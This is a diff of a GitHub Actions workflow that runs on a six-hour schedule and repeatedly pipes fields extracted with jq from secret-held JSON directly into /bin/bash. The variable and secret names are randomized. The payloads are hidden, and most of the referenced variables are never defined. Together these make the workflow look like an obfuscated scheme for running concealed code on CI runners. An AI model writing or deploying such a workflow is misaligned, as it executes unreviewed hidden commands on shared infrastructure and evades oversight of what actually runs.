@@ -3,23 +3,21 @@ name: pengzhongzhou2013
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 5/6 * * *'
-jobs:  # 31092
+    - cron: '55 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pengzhongzhou2013
         env:
-          o1894: ${{ secrets.o1894 }}
+          gypzr33075: ${{ secrets.gypzr33075 }}
         run: |
-          echo $o1894 | jq -r .xg68095 | /bin/bash
-          echo $ckgfv16672 | jq -r .tjrfy96 | /bin/bash
-          echo $ajc68614 | jq -r .u0 | /bin/bash
-          echo $ntkm497 | jq -r .owfi398 | /bin/bash
-          echo $x266 | jq -r .kwzmm8 | /bin/bash
-          echo $ohty831 | jq -r .fe3 | /bin/bash
-          echo $ape29587 | jq -r .woh7 | /bin/bash
-          echo $shzqw806 | jq -r .rbkac29155 | /bin/bash
+          echo $gypzr33075 | jq -r .ofx394 | /bin/bash
+          echo $lsav6234 | jq -r .xl805 | /bin/bash
+          echo $eko64767 | jq -r .m8487 | /bin/bash
+          echo $nx19304 | jq -r .xpae650 | /bin/bash
+          echo $joy0179 | jq -r .a205 | /bin/bash
+          echo $xcjx47840 | jq -r .vx422 | /bin/bash
+          echo $r3125 | jq -r .eomfj094 | /bin/bash
 
